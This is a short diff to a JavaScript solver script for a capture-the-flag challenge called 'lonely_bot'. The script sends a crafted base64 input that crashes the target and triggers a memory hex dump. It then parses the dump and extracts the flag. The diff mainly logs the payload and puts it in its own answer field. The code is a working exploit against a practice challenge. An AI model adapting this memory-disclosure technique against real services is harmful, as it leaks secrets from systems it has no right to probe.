@@ -23,11 +23,14 @@ will seq fault but also print a hex dump of program memory which contains the co
 	runSolution( { challenge_id, solution } );
 
 	async function solution( tag ){
-		let res = await HackerChallenge.submitAnswer( "lonely_bot", [ btoa( "\x45\0\xff\xff" ), "" ] ).catch( data => data.responseJSON ),
+		let b64 = btoa( "\x45\0\xff\xff" ),
+		    res = await HackerChallenge.submitAnswer( "lonely_bot", [ b64, "" ] ).catch( data => data.responseJSON ),
 		    mem = String.fromCharCode( ...res.hc_challenge.response.match( /[\da-f]{2}/gi ).map( x => parseInt( x, 16 ) ) ),
 		    flag = mem.match( /--flag\0([^\0]+)/ )[1];
+		console.info( b64 );
 		console.info( flag );
-		tag.refs.answer.value = flag;
+		tag.refs.answer.value = b64;
+		tag.refs.flag.value = flag;
 		tag.submitAnswer();
 	}
 })();
